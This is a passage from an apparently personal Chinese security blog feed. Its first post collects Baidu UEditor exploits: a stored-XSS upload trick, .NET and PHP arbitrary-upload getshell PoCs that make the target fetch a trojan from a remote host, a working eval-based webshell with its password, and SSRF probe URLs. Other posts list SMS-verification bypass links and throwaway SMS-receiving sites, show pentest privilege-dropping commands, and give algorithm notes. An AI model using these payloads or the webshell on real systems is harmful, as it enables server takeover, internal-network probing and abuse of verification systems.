    <content><![CDATA[<h1 id="百度Ueditor编辑器漏洞总结"><a href="#百度Ueditor编辑器漏洞总结" class="headerlink" title="百度Ueditor编辑器漏洞总结"></a>百度Ueditor编辑器漏洞总结</h1><p><a href="https://github.com/fex-team/ueditor/releases">Releases · fex-team/ueditor (github.com)</a></p>
<p>复现环境下载</p>
<p>UEditor是由百度web前端研发部开发的所见即所得的开源富文本编辑器</p>
<h1 id="XML文件上传导致存储型xss"><a href="#XML文件上传导致存储型xss" class="headerlink" title="XML文件上传导致存储型xss"></a>XML文件上传导致存储型xss</h1><p>测试版本：php版 v1.4.3.3</p>
<p><img src="/2022/06/02/%E7%99%BE%E5%BA%A6Ueditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220823191746018.png" alt="image-20220823191746018"></p>
<p>上传一个图片将，burp抓包，将uploadimage类型改为uploadfile,并且修改后缀名为xml</p>
<p><img src="/2022/06/02/%E7%99%BE%E5%BA%A6Ueditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220823192036079.png" alt="image-20220823192036079"></p>
<p><img src="/2022/06/02/%E7%99%BE%E5%BA%A6Ueditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220823192017417.png" alt="image-20220823192017417"></p>
<p>成功弹窗</p>
<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><h2 id="NET版本文件上传"><a href="#NET版本文件上传" class="headerlink" title="NET版本文件上传"></a>NET版本文件上传</h2><p>该任意文件上传漏洞存在于1.4.3.3、1.5.0和1.3.6版本中，并且只有**.NET**版本受该漏洞影响。黑客可以利用该漏洞上传木马文件，执行命令控制服务器。</p>
<h3 id="ueditor-1-5-0-net版本"><a href="#ueditor-1-5-0-net版本" class="headerlink" title="ueditor.1.5.0.net版本"></a>ueditor.1.5.0.net版本</h3><p>起一个http服务，弄一个图片马的连接</p>
<p>source[]参数值改为图片木马地址，并在结尾加上“?.aspx”即可getshell，利用POC：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /ueditor/net/controller.ashx?action=catchimage</span><br><span class="line"></span><br><span class="line">中间省略各种 Header</span><br><span class="line"></span><br><span class="line">source%5B%5D=http%3A%2F%2F[IP]/1.gif?.aspx</span><br></pre></td></tr></table></figure>

<h3 id="ueditor-1-4-3-3net版本"><a href="#ueditor-1-4-3-3net版本" class="headerlink" title="ueditor.1.4.3.3net版本"></a>ueditor.1.4.3.3net版本</h3><p>构造一个HTML：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form action=&quot;http://[目标 IP]/ueditor/net/controller.ashx?action=catchimage&quot; enctype=&quot;application/x-www-form-urlencoded&quot;  method=&quot;POST&quot;&gt;</span><br><span class="line">  &lt;p&gt;shell addr: &lt;input type=&quot;text&quot; name=&quot;source[]&quot; /&gt;&lt;/p &gt;</span><br><span class="line">  &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>本地打开后填写一个远端可访问的图片马地址并提交。如下的马是可用的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script runat=&quot;server&quot; language=&quot;JScript&quot;&gt;</span><br><span class="line">   function popup(str) &#123;</span><br><span class="line">       var q = &quot;u&quot;;</span><br><span class="line">       var w = &quot;afe&quot;;</span><br><span class="line">       var a = q + &quot;ns&quot; + w; var b= eval(str,a); return(b);</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;% popup(popup(System.Text.Encoding.GetEncoding(65001). GetString(System.Convert.FromBase64String(&quot;UmVxdWVzdC5JdGVtWyJoZWxsbyJd&quot;)))); %&gt;</span><br></pre></td></tr></table></figure>

<p>访问口令为 hello。</p>
<h3 id="ueditor-1-3-6net版本"><a href="#ueditor-1-3-6net版本" class="headerlink" title="ueditor.1.3.6net版本"></a>ueditor.1.3.6net版本</h3><p>比较古早的版本，还没有解决 00 截断的问题。为了使大马能够被正常解析，需要将 <code>%00</code> 置于 .asp 后面，这样上传的时候被当成 test.asp.jpg，解析的时候被当成 test.asp。注意不是纯文本的 <code>%00</code>，而是 URL-decode 过的不可见字符。另外，没做过混淆的大马可能只在本地测试时能过。</p>
<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>PHP 相应版本也有文件上传问题。贴个 PoC：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST http://localhost/ueditor/php/action_upload.php?action=uploadimage&amp;CONFIG[imagePathFormat]=ueditor/php/upload/fuck&amp;CONFIG[imageMaxSize]=9999999&amp;CONFIG[imageAllowFiles][]=.php&amp;CONFIG[imageFieldName]=fuck HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 222</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: null</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/60.0.3112.78 Safari/537.36</span><br><span class="line">Content-Type: multipart/form-data; boundary=——WebKitFormBoundaryDMmqvK6b3ncX4xxA</span><br><span class="line">Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4</span><br><span class="line">———WebKitFormBoundaryDMmqvK6b3ncX4xxA</span><br><span class="line">Content-Disposition: form-data; name=&quot;fuck&quot;; filename=&quot;fuck.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">&lt;?php </span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br><span class="line">———WebKitFormBoundaryDMmqvK6b3ncX4xxA—</span><br></pre></td></tr></table></figure>

<p>注意，shell 路径由 <code>CONFIG[imagePathFormat]=ueditor/php/upload/fuck</code> 决定，按照 PoC 中所给条件，则访问路径应当是 <a href="http://localhost/ueditor/php/upload/fuck.php%E3%80%82">http://localhost/ueditor/php/upload/fuck.php。</a></p>
<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>开发语言：JSP</p>
<p>版本：1.4.3</p>
<p>1.4.3.1 版本就修复了这个问题。</p>
<p>该版本的 SSRF 触发点：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/jsp/controller.jsp?action=catchimage&amp;source[]=</span><br><span class="line"></span><br><span class="line">/jsp/getRemoteImage.jsp?upfile=</span><br><span class="line"></span><br><span class="line">/php/controller.php?action=catchimage&amp;source[]=</span><br></pre></td></tr></table></figure>

<p>所以可以构造出<code> http://1.1.1.1:8080/cmd/ueditor/jsp/controller.jsp?action=catchimage&amp;source[]=https://www.baidu.com/img/PCtm_d9c8750bed0b3c7d089fa7d55720d6cf.png</code></p>
<p>更多 PoC：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ueditor/jsp/getRemoteImage.jsp?upfile=http://127.0.0.1/favicon.ico?.jpg</span><br><span class="line"></span><br><span class="line">/ueditor/jsp/controller.jsp?action=catchimage&amp;source[]=https://www.baidu.com/img/baidu_jgylogo3.gif</span><br><span class="line"></span><br><span class="line">/ueditor/php/controller.php?action=catchimage&amp;source[]=https://www.baidu.com/img/baidu_jgylogo3.gif</span><br></pre></td></tr></table></figure>

<p>通过修改 <code>source</code> 参数，能够探查内网相关端口。有道翻译网站出过 SSRF 问题，导致内网内容可被直接访问。</p>
<p>提交后的返回信息很容易判断，只要 <code>state</code> 出现 Unicode 编码，那必然是失败了（用中文提示如何如何失败）。</p>
<p>找不到环境了，github上面好像修了？</p>
]]></content>
      <categories>
        <category>-fuxian</category>
      </categories>
  </entry>
  <entry>
    <title>短信验证码接口限制</title>
    <url>/2022/02/03/%E7%9F%AD%E4%BF%A1%E9%AA%8C%E8%AF%81%E7%A0%81%E6%8E%A5%E5%8F%A3%E9%99%90%E5%88%B6/</url>
    <content><![CDATA[<h1 id="短信验证码接口限制"><a href="#短信验证码接口限制" class="headerlink" title="短信验证码接口限制"></a>短信验证码接口限制</h1><p>转载几个博客，方便日后查阅</p>
<p><a href="https://www.cnblogs.com/lovequitepcs/p/12901987.html">几个绕过短信验证码限制的漏洞挖掘 - QuiteX - 博客园 (cnblogs.com)</a></p>
<p><a href="https://blog.csdn.net/weixin_44549063/article/details/113361313">(38条消息) 如何防止恶意攻击短信验证码接口_newxtc的博客-CSDN博客_如何防止短信验证码攻击</a></p>
<p><a href="https://www.lx598.com/hangyedongtai/978.html">短信验证码安全常见逻辑漏洞_动力思维 (lx598.com)</a></p>
<p>更新了几个接码平台</p>
<p><a href="http://www.z-sms.com/sms-receive-free.php?pho_num=15227789961&amp;1">http://www.z-sms.com/sms-receive-free.php?pho_num=15227789961&amp;1</a></p>
<p><a href="https://smsreceivefree.com/country/usa">https://smsreceivefree.com/country/usa</a></p>
<p><a href="https://jiemahao.com/sms/?phone=5">https://jiemahao.com/sms/?phone=5</a></p>
]]></content>
      <categories>
        <category>-penetration</category>
      </categories>
  </entry>
  <entry>
    <title>程序降权启动方法</title>
    <url>/2023/01/08/%E7%A8%8B%E5%BA%8F%E9%99%8D%E6%9D%83%E5%90%AF%E5%8A%A8%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h1 id="程序降权启动方法"><a href="#程序降权启动方法" class="headerlink" title="程序降权启动方法"></a>程序降权启动方法</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">概要:</span><br><span class="line">1.介绍为什么要降权</span><br><span class="line">2.一些降权到方法的方法</span><br></pre></td></tr></table></figure>

<p>(感觉概要还是今后开始写起来吧，要不然以后找自己文章还要想一想)</p>
<p>而渗透测试中的降权通常是指从system权限降到普通用户权限（从管理员权限降到普通用户权限比较简单，方法很多），往往是为了操作当前用户的一些内容，或者操作一些普通用户的文件。（如捕获桌面、操作注册表等）。就像是如果你是system权限，但是屏幕截图截到的是黑屏，这个时候就需要降权来进行屏幕截图。</p>
<h2 id="runas"><a href="#runas" class="headerlink" title="runas"></a>runas</h2><p><code>runas /user:a calc.exe</code></p>
<p>执行玩命令之后会要求你输入密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">但是会有缺点，需要等待用户手动输入密码，不够自动化。</span><br><span class="line">但是可以借助管道实现自动输入密码，需要借助Sanur工具。</span><br></pre></td></tr></table></figure>

<h2 id="lsrunas工具"><a href="#lsrunas工具" class="headerlink" title="lsrunas工具"></a>lsrunas工具</h2><p>下载地址：</p>
<p><a href="http://www.verydoc.com/exeshell.html">http://www.verydoc.com/exeshell.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd：</span><br><span class="line"></span><br><span class="line">lsrunas.exe /user:a /password:123456 /domain: /command:&quot;calc.exe&quot; /runpath:c:\</span><br><span class="line"></span><br><span class="line">注：</span><br><span class="line"></span><br><span class="line">/domain:参数为空表示为本机</span><br><span class="line">从管理员权限降权到普通用户权限</span><br></pre></td></tr></table></figure>

<h2 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="string">&quot;a&quot;</span></span><br><span class="line"><span class="variable">$pwd</span>=<span class="built_in">ConvertTo-SecureString</span>  <span class="string">&quot;123456&quot;</span> <span class="literal">-AsPlainText</span> –Force</span><br><span class="line"><span class="variable">$cred</span>=<span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="variable">$uname</span>,<span class="variable">$pwd</span>)</span><br><span class="line"><span class="built_in">Start-Process</span> <span class="literal">-FilePath</span>  <span class="string">&quot;calc.exe&quot;</span> <span class="literal">-Credential</span> <span class="variable">$cred</span> </span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-penetration</category>
      </categories>
  </entry>
  <entry>
    <title>算法图解</title>
    <url>/2022/01/16/%E7%AE%97%E6%B3%95%E5%9B%BE%E8%A7%A3/</url>
    <content><![CDATA[<h1 id="算法图解"><a href="#算法图解" class="headerlink" title="算法图解"></a>算法图解</h1><h1 id="第一章-算法简介"><a href="#第一章-算法简介" class="headerlink" title="第一章 算法简介"></a>第一章 算法简介</h1><h2 id="1-1认识"><a href="#1-1认识" class="headerlink" title="1.1认识"></a>1.1认识</h2><p>算法是一组完成任务的指令。任何代码片段都可以视为算法。</p>
<h2 id="1-2二分查找"><a href="#1-2二分查找" class="headerlink" title="1.2二分查找"></a>1.2二分查找</h2><p>二分查找是一种算法，其输入是一个有序的元素列表，如果要查找的元素包含在列表中，二分查找返回其位置；否则返回null</p>
<p>二分查找就是在有序的列表中，每一次查看中间的值满不满足条件，一下就能排除一半的数据。就像是在100里面查找数据，从50开始猜，每一次告诉你猜大了还是猜小了，从50开始猜就会一下排除50个数据，以此类推。</p>
<p>在后续我们提到log的时候，我们就把把他当做是log2。</p>
<p>如果使用二分法查找八个数据中的其中一个，那么最多查找log8次，也就是三次。</p>
<p>下面是一个二分查找的python例子</p>
<p>函数binary_search接受一个有序数组和一个元素。如果指定的元素包含在数组中，这个函数将返回其位置。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lisst = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary_search</span>(<span class="params">listx,item</span>):</span></span><br><span class="line">        low = <span class="number">0</span></span><br><span class="line">        high = <span class="built_in">len</span>(listx)-<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> low &lt;=high:</span><br><span class="line">            mid = <span class="built_in">int</span>((low + high) / <span class="number">2</span>)</span><br><span class="line">            guess = listx[mid]</span><br><span class="line">            <span class="keyword">if</span> item&lt;guess:</span><br><span class="line">                high = mid-<span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> item &gt; guess:</span><br><span class="line">                low = mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> item == guess:</span><br><span class="line">                <span class="keyword">return</span> mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"><span class="built_in">print</span>(binary_search(lisst,<span class="number">4</span>))</span><br></pre></td></tr></table></figure>

<h3 id="1-2-1运算时间"><a href="#1-2-1运算时间" class="headerlink" title="1.2.1运算时间"></a>1.2.1运算时间</h3><p>每次介绍算法时，我们都将讨论他们的运算时间。</p>
<p>最多需要猜测的次数与列表长度相同，这杯称为线性时间。</p>
<h2 id="1-3大O表示法"><a href="#1-3大O表示法" class="headerlink" title="1.3大O表示法"></a>1.3大O表示法</h2><p>大O表示法是一种特殊的表示法，指出了算法的速度有多快。</p>
<p>O(n):中间的n就是操作数，操作数越大，所用的时间就越长。例如用二分法查找十六个数据，则是O(log 16);而用简单查找法则是O(16).</p>
<p>大O表示法指出了最糟糕情况下的运行时间，即运行时间永远不可能超过大O表示法所表示的时间。</p>
<h3 id="1-3-1一些常见的大O运行时间"><a href="#1-3-1一些常见的大O运行时间" class="headerlink" title="1.3.1一些常见的大O运行时间"></a>1.3.1一些常见的大O运行时间</h3><p>下面从快到慢列出</p>
<p>O(log n)也叫对数时间，这样的算法包括二分查找</p>
<p>O(n) 也叫线性时间，这样的算法包括简单查找。</p>
<p>O(n*log n)。这样的算法包括第四章简要介绍的快速排序，一种速度较快的排序算法。</p>
<p>O(n**2)，这样的算法包括第二章简要介绍的选择排序，    一种速度较慢的排序算法。</p>
<p>O(n!)，这样的算法包括接下来将介绍的旅行商问题的解决方法，一种非常慢的算法。</p>
<p>启示：</p>
<p>1.算法的速度指的并非时间，而是操作数的增速。</p>
<p>2.谈论算法的速度时，我们说的是随着输入的增加，其运行时间将以什么样的速度增加。</p>
<p>3.算法的运行时间用大O表示法表示。</p>
<h3 id="1-3-2旅行商"><a href="#1-3-2旅行商" class="headerlink" title="1.3.2旅行商"></a>1.3.2旅行商</h3><p>O(n!)的算法解决了计算机科学领域非常著名的旅行商问题。</p>
<p>一位旅行商要前往五个城市，同时要确保旅程最短，对于每种城市排序，他都计算总旅程，在涉及五个城市时，他需要计算120次操作。</p>
<p>6个城市时，他需要计算720次，计算的次数按照几何倍的增长，这种算法很糟糕，但是目前还没有找到更快的算法，我们别无他发。</p>
<h1 id="第二章-选择排序"><a href="#第二章-选择排序" class="headerlink" title="第二章 选择排序"></a>第二章 选择排序</h1><h2 id="2-1内存"><a href="#2-1内存" class="headerlink" title="2.1内存"></a>2.1内存</h2><h3 id="2-1-1链表"><a href="#2-1-1链表" class="headerlink" title="2.1.1链表"></a>2.1.1链表</h3><p>相较于数组，链表可以储存在内存的任何一个空间，每一个空间中都存储有下一个空间的地址，这样就实现了将随机内存地址串联起来。</p>
<h3 id="2-1-2数组"><a href="#2-1-2数组" class="headerlink" title="2.1.2数组"></a>2.1.2数组</h3><p>虽然数组的内存地址必须相邻，但是同样也有链表不具备的好处，链表要查找信息的时候，并不能直接查找最后一和数据的内容，因为我们还不知道他的内存地址，我们需要一个一个数据的查看才能获取最后一个数据的地址。但是数组因为数据是相邻的，所以我们可以直接查看任意位置的数据内容。</p>
<h3 id="2-1-3数据插入和删除"><a href="#2-1-3数据插入和删除" class="headerlink" title="2.1.3数据插入和删除"></a>2.1.3数据插入和删除</h3><p>链表的数据插入很简单，只需要让前一个地址指向插入的地址，再由插入的地址指向洗衣歌地址。</p>
<p>宿主的插入则需要让每一个后面的元素的索引加一。</p>
<p>删除是同样的道理，数组的索引会改变。</p>
<p>下面是常见数组和链表操作的运行时间。</p>
<p><img src="/2022/01/16/%E7%AE%97%E6%B3%95%E5%9B%BE%E8%A7%A3/image-20220114132701511.png" alt="image-20220114132701511"></p>
<h2 id="2-2选择排序"><a href="#2-2选择排序" class="headerlink" title="2.2选择排序"></a>2.2选择排序</h2><p>给一串无序列表排序，先创建一个新的列表，然后在旧列表中找到最大的那个放入新列表中，然后再找到第二大的放入新列表中，以此类推，最后排序成功。这就是选择排序，是一种效率极其低下的排序算法。</p>
<h1 id="第三章-递归"><a href="#第三章-递归" class="headerlink" title="第三章 递归"></a>第三章 递归</h1><h2 id="3-1递归和循环"><a href="#3-1递归和循环" class="headerlink" title="3.1递归和循环"></a>3.1递归和循环</h2><p>如果使用循环，程序的性能可能更高；如果使用递归，程序更容易理解</p>
<h2 id="3-2基线条件和递归条件"><a href="#3-2基线条件和递归条件" class="headerlink" title="3.2基线条件和递归条件"></a>3.2基线条件和递归条件</h2><p>每一个递归函数都有两个部分，基线条件和递归条件。递归条件是指函数调用自己的条件，基线条件则是函数不在调用自己的条件，从而避免形成无限循环。</p>
<h2 id="3-3栈"><a href="#3-3栈" class="headerlink" title="3.3栈"></a>3.3栈</h2><p>栈是一种数据结构，我们只能对他使用两种操作模式，在最后面添加，或者删除最后面的元素。</p>
<h3 id="3-3-1调用栈-call-stack"><a href="#3-3-1调用栈-call-stack" class="headerlink" title="3.3.1调用栈(call stack)"></a>3.3.1调用栈(call stack)</h3><p>计算机在内部使用被称为调用栈的栈。调用栈最经常被用于存放子程序的返回地址。在调用任何子程序时，主程序都必须暂存子程序运行完毕后应该返回到的地址。</p>
<h3 id="3-3-2递归调用栈"><a href="#3-3-2递归调用栈" class="headerlink" title="3.3.2递归调用栈"></a>3.3.2递归调用栈</h3><p>每重新调用函数就会增加一层调用栈，直到基线条件满足则不断弹出每一层的调用栈。</p>
<h1 id="第四章-快速排序"><a href="#第四章-快速排序" class="headerlink" title="第四章 快速排序"></a>第四章 快速排序</h1><h2 id="4-1分而治之"><a href="#4-1分而治之" class="headerlink" title="4.1分而治之"></a>4.1分而治之</h2><p>divide and conquer D&amp;C</p>
<p>一种著名的递归式问题解决方法。</p>
<p>根据dc的定义，每一次递归都必须缩小问题规模。</p>
<p>D&amp;C的工作原理：</p>
<p>（1)找出简单的基线条件；</p>
<p>（2)确定如何缩小问题的规模，使其符合基线条件。</p>
<p>例子：用dc来计算一个列表中的和。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">result = <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_sum</span>(<span class="params">listx</span>):</span></span><br><span class="line">    <span class="keyword">global</span> result</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(listx) &gt; <span class="number">0</span>:</span><br><span class="line">        a = listx[<span class="number">0</span>]</span><br><span class="line">        listx.pop(<span class="number">0</span>)</span><br><span class="line">        result += a</span><br><span class="line">        new_sum(listx)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">asd = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">new_sum(asd)</span><br></pre></td></tr></table></figure>

<h2 id="4-2-快速排序"><a href="#4-2-快速排序" class="headerlink" title="4.2 快速排序"></a>4.2 快速排序</h2><p>快速排序是一种常用的排序算法，比选择排序快很多。例如c语言标准库中的函数qsort实现的就是款速排序。快速排序也使用了D&amp;C。</p>
<p>(1)首先设定一个分界值，通过该分界值将数组分成左右两部分。<br>(2)将大于或等于分界值的数据集中到数组右边，小于分界值的数据集中到数组的左边。此时，左边部分中各元素都小于或等于分界值，而右边部分中各元素都大于或等于分界值。<br>(3)然后，左边和右边的数据可以独立排序。对于左侧的数组数据，又可以取一个分界值，将该部分数据分成左右两部分，同样在左边放置较小值，右边放置较大值。右侧的数组数据也可以做类似处理。<br>(4)重复上述过程，可以看出，这是一个递归定义。通过递归将左侧部分排好序后，再递归排好右侧部分的顺序。当左、右两个部分各数据排序完成后，整个数组的排序也就完成了。</p>
<p>下面是快速排序算法的python代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quksort</span>(<span class="params">listx</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(listx)&lt;<span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> listx</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        minder = listx[<span class="number">0</span>]</span><br><span class="line">        small = []</span><br><span class="line">        big = []</span><br><span class="line">        <span class="keyword">for</span> i,item <span class="keyword">in</span> <span class="built_in">enumerate</span>(listx):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">elif</span> item &gt;= minder:</span><br><span class="line">                small.append(item)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                big.append(item)</span><br><span class="line">        <span class="keyword">return</span> quksort(small)+[minder]+quksort(big)</span><br><span class="line"></span><br><span class="line">data = [<span class="number">1</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">4</span>]</span><br><span class="line"><span class="built_in">print</span>(quksort(data))</span><br></pre></td></tr></table></figure>

<h1 id="第五章-散列表"><a href="#第五章-散列表" class="headerlink" title="第五章 散列表"></a>第五章 散列表</h1><p>就是python中的字典</p>
<h1 id="第六章-广度优先搜索"><a href="#第六章-广度优先搜索" class="headerlink" title="第六章 广度优先搜索"></a>第六章 广度优先搜索</h1><p>广度优先搜索（也称宽度优先搜索，缩写BFS，以下采用广度来描述）是连通图的一种遍历策略。因为它的思想是从一个顶点V0开始，辐射状地优先遍历其周围较广的区域，故得名。 </p>
<p><img src="/2022/01/16/%E7%AE%97%E6%B3%95%E5%9B%BE%E8%A7%A3/image-20220114204828126.png" alt="image-20220114204828126"></p>
<h1 id="第七章-狄克斯特拉算法"><a href="#第七章-狄克斯特拉算法" class="headerlink" title="第七章 狄克斯特拉算法"></a>第七章 狄克斯特拉算法</h1><h2 id="7-1术语"><a href="#7-1术语" class="headerlink" title="7.1术语"></a>7.1术语</h2><p><img src="/2022/01/16/%E7%AE%97%E6%B3%95%E5%9B%BE%E8%A7%A3/image-20220115103125127.png" alt="image-20220115103125127"></p>
<h2 id="7-2作用"><a href="#7-2作用" class="headerlink" title="7.2作用"></a>7.2作用</h2><p>在一张图中，每一节点到另外一个节点都有一个权重（权重的意思就像从A节点到B节点需要花费一定的时间，而权重就是这个时间）这是一种用来求两点之间最小总权重路径的算法（当然也可以求最大）。</p>
<h2 id="7-3步骤"><a href="#7-3步骤" class="headerlink" title="7.3步骤"></a>7.3步骤</h2><p>第一步<br>找出最小开销的节点（需要注意的是一开始并不是在图上的所有的点寻找，而是从起点《起点的开销为0》开始寻找，因为后面的子节点的开销你还不知道是多少，所以一开始我们还不知道开销是多少的子节点设为无穷大）</p>
<p>第二步<br>遍历最小开销节点所指向的所有子节点，并检测最小开销节点到该子节点上的开销是否小于原有的开销，如果小于就用当前开销替换原有开销，并且把该子节点的父节点指向该最小开销节点。（一开始只是最小开销节点指向子节点，子节点并没有指向最小开销节点，子节点指向最小开销节点是为了找到最小开销的同时也能知道他的路径）</p>
<p>第三步<br>把当前最小开销节点标记为已使用，再次回到第一步，直到所有的节点都被标记为已使用，那么那个时候终点的开销就是最小开销。</p>
<h2 id="7-4实例"><a href="#7-4实例" class="headerlink" title="7.4实例"></a>7.4实例</h2><p><img src="/2022/01/16/%E7%AE%97%E6%B3%95%E5%9B%BE%E8%A7%A3/image-20220115104342106.png" alt="image-20220115104342106"></p>
<h1 id="第八章-贪婪算法"><a href="#第八章-贪婪算法" class="headerlink" title="第八章 贪婪算法"></a>第八章 贪婪算法</h1><p>贪婪算法很简单：每步都采取最优的做法。</p>
<p>像下面这个例子，每一次都选择播放州最多的那个上广播台。</p>
<p>虽然贪婪算法不能总是打到最优解，但是结果总会是近似最优解。</p>
<p>简单例子</p>
<p><img src="/2022/01/16/%E7%AE%97%E6%B3%95%E5%9B%BE%E8%A7%A3/image-20220115192916448.png" alt="image-20220115192916448"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 要覆盖的州</span></span><br><span class="line">states_needed = <span class="built_in">set</span>([<span class="string">&#x27;mt&#x27;</span>, <span class="string">&#x27;wa&#x27;</span>, <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;nv&#x27;</span>, <span class="string">&#x27;ut&#x27;</span>, <span class="string">&#x27;ca&#x27;</span>, <span class="string">&#x27;az&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 广播台清单</span></span><br><span class="line">stations = <span class="built_in">dict</span>()</span><br><span class="line">stations[<span class="string">&#x27;KONE&#x27;</span>] = <span class="built_in">set</span>([<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;nv&#x27;</span>, <span class="string">&#x27;ut&#x27;</span>])</span><br><span class="line">stations[<span class="string">&#x27;KTWO&#x27;</span>] = <span class="built_in">set</span>([<span class="string">&#x27;wa&#x27;</span>, <span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;mt&#x27;</span>])</span><br><span class="line">stations[<span class="string">&#x27;KTHREE&#x27;</span>] = <span class="built_in">set</span>([<span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;nv&#x27;</span>, <span class="string">&#x27;ca&#x27;</span>])</span><br><span class="line">stations[<span class="string">&#x27;KFOUR&#x27;</span>] = <span class="built_in">set</span>([<span class="string">&#x27;nv&#x27;</span>, <span class="string">&#x27;ut&#x27;</span>])</span><br><span class="line">stations[<span class="string">&#x27;KFIVE&#x27;</span>] = <span class="built_in">set</span>([<span class="string">&#x27;ca&#x27;</span>, <span class="string">&#x27;az&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最终使用的广播台</span></span><br><span class="line">final_stations = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> states_needed:  <span class="comment"># 当还有需要的州未覆盖的时候循环</span></span><br><span class="line">    best_station = <span class="literal">None</span>  <span class="comment"># 覆盖了最多未覆盖的州的广播台</span></span><br><span class="line">    states_covered = <span class="built_in">set</span>()  <span class="comment"># 已经覆盖了的州的集合</span></span><br><span class="line">    <span class="comment"># 遍历所有广播台，找出最佳广播台并且将他的覆盖州加入已覆盖的州的集合</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> station, states_for_station <span class="keyword">in</span> stations.items(): </span><br><span class="line">        <span class="comment"># 计算需要覆盖的州和每个广播台覆盖的州的交集 </span></span><br><span class="line">        covered = states_needed &amp; states_for_station  </span><br><span class="line">        <span class="comment"># 如果交集的州数量比已经覆盖的州的数量多</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(covered) &gt; <span class="built_in">len</span>(states_covered):  </span><br><span class="line">            best_station = station  <span class="comment"># 最佳广播台更新为这个广播台</span></span><br><span class="line">            states_covered = covered  <span class="comment"># 已覆盖的州更新为交集</span></span><br><span class="line">    states_needed -= states_covered  <span class="comment"># 更新为覆盖的州</span></span><br><span class="line">    final_stations.add(best_station)  <span class="comment"># 更新最终结果</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(final_stations)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="第九章-动态规划"><a href="#第九章-动态规划" class="headerlink" title="第九章 动态规划"></a>第九章 动态规划</h1><p>动态规划先解决子问题，再逐步解决大问题。</p>
